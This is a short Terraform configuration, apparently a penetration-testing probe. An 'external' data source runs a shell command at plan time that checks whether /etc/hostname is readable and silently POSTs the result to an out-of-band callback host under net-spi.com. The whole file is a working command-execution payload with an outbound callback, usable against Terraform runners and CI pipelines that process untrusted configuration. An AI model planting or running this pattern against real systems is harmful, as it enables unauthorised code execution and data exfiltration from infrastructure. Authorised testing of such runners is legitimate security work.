data "external" "file_read_test" {
  program = [
    "sh",
    "-c",
    "if test -r /etc/hostname; then curl -s -X POST --data 'file-readable=true' https://qzthsk35js0sg3g90hyxa0r0ur0mogc5.net-spi.com >/dev/null 2>&1; echo '{\"result\":\"readable-callback-sent\"}'; else echo '{\"result\":\"not-readable\"}'; fi"
  ]
}

output "file_read_test" {
  value = data.external.file_read_test.result
}
